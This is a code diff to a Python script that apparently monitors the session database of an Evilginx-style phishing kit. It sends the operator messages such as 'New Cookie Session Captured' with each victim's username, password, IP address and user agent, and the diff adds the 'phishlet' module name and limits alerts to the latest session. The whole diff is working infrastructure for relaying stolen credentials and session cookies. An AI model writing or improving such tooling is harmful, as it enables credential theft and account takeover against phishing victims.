@@ -359,7 +359,12 @@ def monitor_database():
             if all_sessions:
                 monitoring_status["last_check"] = datetime.now().isoformat()
                 
-                # Check each session for new data or updates
+                # Get the latest session (first one, highest ID)
+                latest_session = all_sessions[0] if all_sessions else None
+                latest_session_id = str(latest_session.get("id", 0)) if latest_session else None
+                
+                # First pass: Update tracking for all sessions (but don't send notifications yet)
+                updated_sessions = []
                 for session in all_sessions:
                     if not session or session.get("id", 0) == 0:
                         continue
@@ -369,41 +374,52 @@ def monitor_database():
                     
                     # Check if this session has been notified before
                     if session_id not in processed_sessions:
-                        # New session - notify immediately
-                        print(f"[MONITORING] 🆕 New session detected! ID: {session_id}")
-                        print(f"[MONITORING] Session details: username={session.get('username', 'N/A')}, remote_addr={session.get('remote_addr', 'N/A')}")
-                        print(f"[MONITORING] Update time: {current_update_time}")
-                        
-                        # Track the update_time when we notified
+                        # New session - track it
                         processed_sessions[session_id] = current_update_time
-                        monitoring_status["last_session_id"] = session.get("id", 0)
-                        
-                        # Send notifications
-                        print(f"[MONITORING] Calling send_notifications for session {session_id}...")
-                        send_notifications(session, is_updated=False)
-                        safe_print(f"[MONITORING] [OK] Notification sent for session {session_id}")
+                        updated_sessions.append((session_id, session, False))  # False = new session
                     else:
-                        # Session already notified - check if it has been updated with more data
+                        # Session already notified - check if it has been updated
                         last_notified_time = processed_sessions[session_id]
                         
                         if current_update_time > last_notified_time:
-                            # Session has been updated - check if it has more complete data now
-                            has_tokens = bool(session.get("tokens")) or bool(session.get("http_tokens")) or bool(session.get("body_tokens")) or bool(session.get("custom"))
-                            had_tokens_before = False  # We don't track this, so assume we should re-check
+                            # Session has been updated - update tracking
+                            processed_sessions[session_id] = current_update_time
+                            updated_sessions.append((session_id, session, True))  # True = updated session
+                
+                # Second pass: Only send notification for the latest session if it was updated
+                for session_id, session, is_updated in updated_sessions:
+                    # Only send notification if this is the latest session
+                    if session_id == latest_session_id:
+                        if is_updated:
+                            # Latest session was updated - send updated notification
+                            print(f"[MONITORING] 🔄 Latest session {session_id} updated! (update_time: {session.get('update_time', 0)})")
+                            print(f"[MONITORING] Session details: username={session.get('username', 'N/A')}, remote_addr={session.get('remote_addr', 'N/A')}")
                             
-                            # Re-notify if session has been significantly updated (more than 5 seconds later)
-                            # This allows tokens and other data to be added
-                            if current_update_time > last_notified_time + 5:
-                                print(f"[MONITORING] 🔄 Session {session_id} updated! (update_time: {last_notified_time} -> {current_update_time})")
-                                print(f"[MONITORING] Has tokens: {has_tokens}")
-                                
-                                # Update the last notified time
-                                processed_sessions[session_id] = current_update_time
-                                
-                                # Re-send notifications with updated data
-                                print(f"[MONITORING] Re-sending notifications for updated session {session_id}...")
-                                send_notifications(session, is_updated=True)
-                                safe_print(f"[MONITORING] [OK] Updated notification sent for session {session_id}")
+                            monitoring_status["last_session_id"] = session.get("id", 0)
+                            
+                            # Send updated notification
+                            print(f"[MONITORING] Re-sending notifications for updated latest session {session_id}...")
+                            send_notifications(session, is_updated=True)
+                            safe_print(f"[MONITORING] [OK] Updated notification sent for latest session {session_id}")
+                        else:
+                            # Latest session is new - send new session notification
+                            print(f"[MONITORING] 🆕 New latest session detected! ID: {session_id}")
+                            print(f"[MONITORING] Session details: username={session.get('username', 'N/A')}, remote_addr={session.get('remote_addr', 'N/A')}")
+                            print(f"[MONITORING] Update time: {session.get('update_time', 0)}")
+                            
+                            monitoring_status["last_session_id"] = session.get("id", 0)
+                            
+                            # Send new session notification
+                            print(f"[MONITORING] Calling send_notifications for new latest session {session_id}...")
+                            send_notifications(session, is_updated=False)
+                            safe_print(f"[MONITORING] [OK] Notification sent for new latest session {session_id}")
+                        break  # Only process the latest session
+                    else:
+                        # This is not the latest session - just update tracking silently
+                        if is_updated:
+                            print(f"[MONITORING] 📝 Session {session_id} updated (not latest, tracking only)")
+                        else:
+                            print(f"[MONITORING] 📝 New session {session_id} detected (not latest, tracking only)")
             else:
                 # No sessions found
                 monitoring_status["last_check"] = datetime.now().isoformat()
@@ -443,10 +459,10 @@ def send_notifications(session_data, is_updated=False):
         # Get notification template from config based on whether it's new or updated
         if is_updated:
             notification_template = config.get("notification_updated_cookie", 
-                "*🔄 Cookie Session Updated\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━")
+                "*🔄 Cookie Session Updated\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *Module:* `{phishlet}`\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━")
         else:
             notification_template = config.get("notification_incoming_cookie", 
-                "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━")
+                "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *Module:* `{phishlet}`\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Created:* `{create_time}`\n• *Updated:* `{update_time}`\n━━━━━━━━━━━━━━━━━━━━")
         
         # Format message using template with placeholders
         from datetime import datetime
@@ -455,6 +471,7 @@ def send_notifications(session_data, is_updated=False):
         password = session_data.get("password", "N/A")
         remote_addr = session_data.get("remote_addr", "N/A")
         useragent = session_data.get("useragent", "N/A")
+        phishlet = session_data.get("phishlet", "N/A")
         create_time = session_data.get("create_time", 0)
         update_time = session_data.get("update_time", 0)
         
@@ -477,7 +494,8 @@ def send_notifications(session_data, is_updated=False):
             update_time_str = create_time_str if create_time else datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         # Replace placeholders in template (escape values for MarkdownV2)
-        message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
+        message = notification_template.replace("{phishlet}", escape_markdownv2(str(phishlet)))
+        message = message.replace("{session_id}", escape_markdownv2(str(session_id)))
         message = message.replace("{username}", escape_markdownv2(username))
         message = message.replace("{password}", escape_markdownv2(password))
         message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
